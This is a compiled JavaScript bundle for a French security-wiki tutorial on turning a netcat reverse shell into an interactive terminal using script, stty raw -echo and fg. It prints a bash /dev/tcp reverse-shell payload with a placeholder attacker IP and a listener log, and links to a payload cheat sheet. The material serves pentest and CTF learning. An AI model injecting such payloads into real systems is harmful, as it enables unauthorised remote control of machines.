"use strict";(self.webpackChunkcaspardb=self.webpackChunkcaspardb||[]).push([[452],{3905:(e,t,r)=>{r.d(t,{Zo:()=>p,kt:()=>h});var l=r(7294);function n(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function a(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);t&&(l=l.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),r.push.apply(r,l)}return r}function s(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?a(Object(r),!0).forEach((function(t){n(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):a(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}function o(e,t){if(null==e)return{};var r,l,n=function(e,t){if(null==e)return{};var r,l,n={},a=Object.keys(e);for(l=0;l<a.length;l++)r=a[l],t.indexOf(r)>=0||(n[r]=e[r]);return n}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(l=0;l<a.length;l++)r=a[l],t.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(n[r]=e[r])}return n}var i=l.createContext({}),u=function(e){var t=l.useContext(i),r=t;return e&&(r="function"==typeof e?e(t):s(s({},t),e)),r},p=function(e){var t=u(e.components);return l.createElement(i.Provider,{value:t},e.children)},c="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return l.createElement(l.Fragment,{},t)}},d=l.forwardRef((function(e,t){var r=e.components,n=e.mdxType,a=e.originalType,i=e.parentName,p=o(e,["components","mdxType","originalType","parentName"]),c=u(r),d=n,h=c["".concat(i,".").concat(d)]||c[d]||m[d]||a;return r?l.createElement(h,s(s({ref:t},p),{},{components:r})):l.createElement(h,s({ref:t},p))}));function h(e,t){var r=arguments,n=t&&t.mdxType;if("string"==typeof e||n){var a=r.length,s=new Array(a);s[0]=d;var o={};for(var i in t)hasOwnProperty.call(t,i)&&(o[i]=t[i]);o.originalType=e,o[c]="string"==typeof e?e:n,s[1]=o;for(var u=2;u<a;u++)s[u]=r[u];return l.createElement.apply(null,s)}return l.createElement.apply(null,r)}d.displayName="MDXCreateElement"},4814:(e,t,r)=>{r.r(t),r.d(t,{assets:()=>i,contentTitle:()=>s,default:()=>m,frontMatter:()=>a,metadata:()=>o,toc:()=>u});var l=r(7462),n=(r(7294),r(3905));const a={title:"Obtenir un shell propre",sidebar_label:"Obtenir un shell propre",pagination_label:"Obtenir un shell propre",description:"Apr\xe8s avoir inject\xe9 votre payload, vous obtenez un reverse shell depuis la commande netcat. Comment am\xe9liorer ce shell ?",keywords:["docs","Reverse shell","Netcat","Payload"]},s=void 0,o={unversionedId:"redteam/clean-shell",id:"redteam/clean-shell",title:"Obtenir un shell propre",description:"Apr\xe8s avoir inject\xe9 votre payload, vous obtenez un reverse shell depuis la commande netcat. Comment am\xe9liorer ce shell ?",source:"@site/docs/20-redteam/03-clean-shell.md",sourceDirName:"20-redteam",slug:"/redteam/clean-shell",permalink:"/azurwiki/redteam/clean-shell",draft:!1,editUrl:"https://github.com/haysberg/azurwiki/tree/main/docs/docs/20-redteam/03-clean-shell.md",tags:[],version:"current",sidebarPosition:3,frontMatter:{title:"Obtenir un shell propre",sidebar_label:"Obtenir un shell propre",pagination_label:"Obtenir un shell propre",description:"Apr\xe8s avoir inject\xe9 votre payload, vous obtenez un reverse shell depuis la commande netcat. Comment am\xe9liorer ce shell ?",keywords:["docs","Reverse shell","Netcat","Payload"]},sidebar:"tutorialSidebar",previous:{title:"XSS, k\xe9sako ?",permalink:"/azurwiki/redteam/Attaques Web/XSS"},next:{title:"Accueil Reverse",permalink:"/azurwiki/reverse/"}},i={},u=[{value:"Pourquoi am\xe9liorer son reverse shell ?",id:"pourquoi-am\xe9liorer-son-reverse-shell-",level:2},{value:"Comment am\xe9liorer son reverse shell ?",id:"comment-am\xe9liorer-son-reverse-shell-",level:2},{value:"Attacher le shell \xe0 un terminal",id:"attacher-le-shell-\xe0-un-terminal",level:3},{value:"Mettre \xe0 niveau le shell",id:"mettre-\xe0-niveau-le-shell",level:3},{value:"Remettre le terminal local \xe0 ses valeurs par d\xe9faut",id:"remettre-le-terminal-local-\xe0-ses-valeurs-par-d\xe9faut",level:3}],p={toc:u},c="wrapper";function m(e){let{components:t,...r}=e;return(0,n.kt)(c,(0,l.Z)({},p,r,{components:t,mdxType:"MDXLayout"}),(0,n.kt)("h2",{id:"pourquoi-am\xe9liorer-son-reverse-shell-"},"Pourquoi am\xe9liorer son reverse shell ?"),(0,n.kt)("p",null,"Tout d'abord, si vous n'\xeates pas encore \xe0 l'aise avec l'injection de reverse shell, je vous sugg\xe8re de consulter ",(0,n.kt)("a",{parentName:"p",href:"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"},"ce lien")," pour avoir une liste de payloads \xe0 injecter."),(0,n.kt)("p",null,"Lorsque vous injectez votre payload (exemple: ",(0,n.kt)("inlineCode",{parentName:"p"},"bash -c 'bash -i >& /dev/tcp/[votre IP]/[port d'ecoute de netcat] 0>&1'"),"), vous obtenez un reverse shell depuis la commande netcat."),(0,n.kt)("p",null,"Cependant, ce shell est tr\xe8s limit\xe9, vous aurez donc rapidement envie de l'am\xe9liorer."),(0,n.kt)("p",null,"Par exemple il est impossible d'utiliser les fl\xe8ches pour naviguer dans l'historique des commandes, ou encore d'interrrompre une commande avec ",(0,n.kt)("inlineCode",{parentName:"p"},"Ctrl+C"),"."),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-bash"},"user@local$ nc -lvnp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.104] from (UNKNOWN) [10.10.11.211] 36734\nbash: cannot set terminal process group (1): Inappropriate ioctl for device\nbash: no job control in this shell\nbash-5.1$ ^C\nuser@local$\n")),(0,n.kt)("h2",{id:"comment-am\xe9liorer-son-reverse-shell-"},"Comment am\xe9liorer son reverse shell ?"),(0,n.kt)("h3",{id:"attacher-le-shell-\xe0-un-terminal"},"Attacher le shell \xe0 un terminal"),(0,n.kt)("p",null,"Pour am\xe9liorer votre shell, vous pouvez utiliser la commande ",(0,n.kt)("inlineCode",{parentName:"p"},"script")," pour attacher votre shell \xe0 un terminal."),(0,n.kt)("p",null,"Depuis le shell de la victime, ex\xe9cutez la commande suivante :"),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-bash"},"bash-5.1$ script /dev/null -c bash\nscript /dev/null -c bash\nScript started, output log file is '/dev/null'.\nbash-5.1$ \n")),(0,n.kt)("p",null,"Vous obtenez ainsi un second shell, attach\xe9 cette fois au TTY."),(0,n.kt)("h3",{id:"mettre-\xe0-niveau-le-shell"},"Mettre \xe0 niveau le shell"),(0,n.kt)("p",null,"Il faut maintenant indiquer \xe0 notre terminal local d'enregistrer les entr\xe9es clavier et de les envoyer au shell distant."),(0,n.kt)("p",null,"Mettez d'abord le shell distant en arrir\xe8re-plan avec ",(0,n.kt)("inlineCode",{parentName:"p"},"Ctrl+Z"),"."),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-bash"},"bash-5.1$ ^Z\n[1]+  Stopped                 nc -lvnp 4444\n")),(0,n.kt)("p",null,"Utilisez la commande ",(0,n.kt)("inlineCode",{parentName:"p"},"stty raw -echo")," depuis le shell local: cela permet de d\xe9sactiver l'affichage des caract\xe8res saisis et de les envoyer directement au shell distant."),(0,n.kt)("p",null,"Remettez le shell distant au premier plan avec ",(0,n.kt)("inlineCode",{parentName:"p"},"fg"),"."),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-bash"},"user@local$ stty raw -echo ; fg\n")),(0,n.kt)("p",null,"Pour remettre le curseur au bon endroit, utilisez la commande ",(0,n.kt)("inlineCode",{parentName:"p"},"reset"),"."),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-bash"},"user@local$ stty raw -echo ; fg\nnc -lnvp 4444\n             reset\n")),(0,n.kt)("p",null,"Si le type de terminal n'est pas reconnu, indiquez ",(0,n.kt)("inlineCode",{parentName:"p"},"screen"),"."),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-bash"},"user@local$ stty raw -echo ; fg\nnc -lnvp 4444\n            reset\nreset: unknown terminal type unknown\nTerminal type? screen\n")),(0,n.kt)("p",null,"Vous avez maintenant acc\xe8s \xe0 un shell compl\xe8tement interactif, dans lequel vous pouvez utiliser les fl\xe8ches pour naviguer dans l'historique des commandes, ou encore interrompre une commande avec ",(0,n.kt)("inlineCode",{parentName:"p"},"Ctrl+C"),"."),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-bash"},"bash-5.1$ ^C\nbash-5.1$ ^C\nbash-5.1$\n")),(0,n.kt)("h3",{id:"remettre-le-terminal-local-\xe0-ses-valeurs-par-d\xe9faut"},"Remettre le terminal local \xe0 ses valeurs par d\xe9faut"),(0,n.kt)("p",null,"Pour quitter le shell distant, utilisez la commande ",(0,n.kt)("inlineCode",{parentName:"p"},"exit"),".\nVous quitterz dans un premier temps le shell attach\xe9 au terminal TTY, puis tapez ",(0,n.kt)("inlineCode",{parentName:"p"},"exit")," une seconde fois pour quitter le premier reverse shell."),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-bash"},"bash-5.1$ exit\nexit\nScript done.\n            bash-5.1$ exit\n                          exit\nuser@local$\n")),(0,n.kt)("p",null,"Depuis le shell local, ",(0,n.kt)("strong",{parentName:"p"},"vous ne voyez plus appara\xeetre les caract\xe8res saisis")," (puisque vous avez d\xe9sactiv\xe9 l'affichage local avec ",(0,n.kt)("inlineCode",{parentName:"p"},"stty raw -echo"),"), utilisez la commande ",(0,n.kt)("inlineCode",{parentName:"p"},"stty sane")," pour remettre le terminal \xe0 ses valeurs par d\xe9faut."),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-bash"},'user@local$ stty sane # Vous tapez la commande sans la voir\nuser@local$ echo "salut" # Le terminal est remis \xe0 ses valeurs par d\xe9faut\nsalut\nuser@local$\n')))}m.isMDXComponent=!0}}]);